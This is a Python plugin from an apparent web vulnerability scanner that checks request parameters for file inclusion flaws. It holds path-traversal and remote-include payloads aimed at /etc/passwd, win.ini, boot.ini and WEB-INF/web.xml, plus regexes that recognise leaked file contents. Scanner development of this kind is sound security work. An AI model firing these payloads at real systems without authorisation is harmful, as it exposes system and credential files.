#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2019/7/8
# JiuZero 2025/7/5

import re
from urllib.parse import unquote
from api import generateResponse, conf, KB, VulType, PluginBase, Type, Threads


class Z0SCAN(PluginBase):
    name = "fileinclude"
    desc = 'File Include'
    version = "2025.7.6"
    risk = 2

    def condition(self, iterdatas):
        if conf.level == 0 or self.fingerprints.waf:
            return False
        for _ in iterdatas:
            key, value, position = _
            if ("." in value or "/" in value) or (key.lower() in ['filename', 'file', 'path', 'filepath']):
                return True
        return False
    
    def generate_payloads(self):
        payloads = []
        default_extension = ".jpg"
        payloads = [
            "../../../../../../../../../../../etc/passwd%00",
            "/etc/passwd", 
            "http://cirt.net/rfiinc.txt?",
            ]
        if "LINUX" in self.fingerprints.finger or "DARWIN" in self.fingerprints.finger:
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
            payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
        if "WINDOWS" in self.fingerprints.finger:
            payloads.append("../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\boot.ini")
            # if origin:
            #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
            payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
        if "JAVA" in self.fingerprints.finger:
            payloads.append("/WEB-INF/web.xml")
            payloads.append("../../WEB-INF/web.xml")
        return payloads

    def audit(self):
        iterdatas = self.generateItemdatas()
        if not self.condition(iterdatas):
            return
        plainArray = [
            r"; for 16-bit app support",
            r"[MCI Extensions.BAK]",
            r"# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
            r"# localhost name resolution is handled within DNS itself.",
            r"[boot loader]"
        ]

        regexArray = [
            r'(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)',
            r'(root:\w:\d*:)',
            r"System\.IO\.FileNotFoundException: Could not find file\s'\w:",
            r"System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
            r"<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>",
            r"(<web-app[\s\S]+<\/web-app>)",
            r"Warning: fopen\(",
            r"open_basedir restriction in effect",
            r'/bin/(bash|sh)[^\r\n<>]*[\r\n]',
            r'\[boot loader\][^\r\n<>]*[\r\n]',
            r'java\.io\.FileNotFoundException:',
            r'java\.lang\.Exception:',
            r'java\.lang\.IllegalArgumentException:',
            r'java\.net\.MalformedURLException:',
            r'The server encountered an internal error \(.*\) that prevented it from fulfilling this request\.',
            r'fread\(\):',
            r"for inclusion '\(include_path=",
            r'Failed opening required',
            r'&lt;b&gt;Warning&lt;/b&gt;:  file\(',
            r'&lt;b&gt;Warning&lt;/b&gt;:  file_get_contents\(',
            r'No such file or directory', 
            r'<title>phpinfo', 
        ]
        payloads = self.generate_payloads()
        z0thread = Threads(name="trave-path")
        z0thread.submit(self.process, iterdatas, payloads, plainArray, regexArray)
                
    def process(self, _, payloads, plainArray, regexArray):
        k, v, position = _
        for _payload in payloads:
            payload = self.insertPayload({
                "key": k, 
                "value": v, 
                "position": position, 
                "payload": _payload
                })
            r = self.req(position, payload)
            if not r:
                continue
            html1 = r.text
            for plain in plainArray:
                if plain in html1:
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.FILE_INCLUDE, 
                        "show": {
                            "Position": r"{position} >> {k}", 
                            "Payload": payload
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Match: {}".format(payload, plain)
                        })
                    self.success(result)
                    return
            for regex in regexArray:
                if re.search(regex, html1, re.I | re.S | re.M):
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.FILE_INCLUDE, 
                        "show": {
                            "Position": r"{position} >> {k}", 
                            "Payload": payload
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Match: {}".format(payload, regex)
                        })
                    self.success(result)
                    return
